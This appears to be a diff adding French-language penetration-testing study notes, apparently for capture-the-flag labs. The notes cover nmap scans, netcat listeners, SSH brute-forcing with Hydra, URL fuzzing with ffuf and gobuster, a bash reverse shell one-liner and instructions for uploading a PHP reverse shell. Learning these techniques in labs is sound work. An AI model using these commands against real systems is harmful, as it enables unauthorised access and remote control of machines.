@@ -1,0 +1,74 @@
+ACTIVE RECONNAISSANCE 
+
+extensions : Wappalyzer : pour voir les technologies d'un site (quelles versions du serveur, quel cms
+
+NMAP 
+adresse IP -sV -v
+-sV : la version du l'application 
+-v verbose 
+
+nmap -sS -Pn -T5 -p- 10.10.119.88
+-sS : SYN Scan (envoie un syn et attend un ack)
+-Pn : considère les hotes comme actif, même si le ping échoue (bypass les blocs de ping) 
+-T5 : très rapide mais pas discret 
+-p- scanne tous les ports de 1 à 65535) 
+
+NETCAT SE CONNECTER EN TCP 
+écoute aux ports, se connecte aux ports 
+nc MACHINE_IP N°PORT -v
+GET / HTTP/1.1
+SHIFT+ENTER after the GET line.
+
+-l 	Listen mode
+-p 	Specify the Port number
+-n 	Numeric only; no resolution of hostnames via DNS
+-v 	Verbose output (optional, yet useful to discover any bugs)
+-vv 	Very Verbose (optional)
+-k 	Keep listening after client disconnects
+
+ECOUTER AVEC NETCAT
+nc -vnlp 80
+
+SE CONNECTER EN SSH 
+ssh -p 22 username@ip-address /
+
+
+
+BRUTEFORCER UN MDP AVEC HYDRA
+hydra -l username -P /root/Desktop/Tools/wordlists/rockyou.txt 10.10.199.20 -t 4 ssh
+
+
+TROUVER DES URLS avec FFUF
+ffuf -u http://nomdedomaine/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -s
+le -s= silent pour avoir seulement les résultats 
+taper ensuite tous les résultats en rajoutant /"resultat" à la fin de l'url 
+
+
+GOBUSTER pour trouver des url cachées
+
+gobuster dir -u URL:PORT -w WORDLIST_PATH
+
+FAIRE UN SHELL 
+bash -c 'bash -pi >& /dev/tcp/<HOST>/<PORT> 0>&1'
+-i = shell interactif 
+/dev/tcp/<HOST>/<PORT> est une fonctionnalité spéciale de Bash qui permet de créer une connexion à un hôte et à un port spécifiés en utilisant un socket TCP. redirige la sortie du shell interactif vers un serveur à travers un socket TCP.
+0>&1 :
+Cela redirige l'entrée standard (stdin) vers la sortie standard (stdout)
+
+FAIRE UN REVERSE SHELL
+
+1- en prendre un ici : https://www.revshells.com/
+où lui : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+Remplacer le "ip" par notre ip de la machine, comme ça on reçoit la connexion. garder le port 
+Ouvrir un autre terminal qui va écouter la connexion
+nc -lvnp 1234
+
+si le shell a été upload sur un file, essayer d'y accéder dans l'url pour l'activer 
+
+Une fois la connexion reçue, possible de taper des commandes 
+
+ECOUTER AVEC NETCAT 
+nc -lnvp numeroport
+
+RCE 
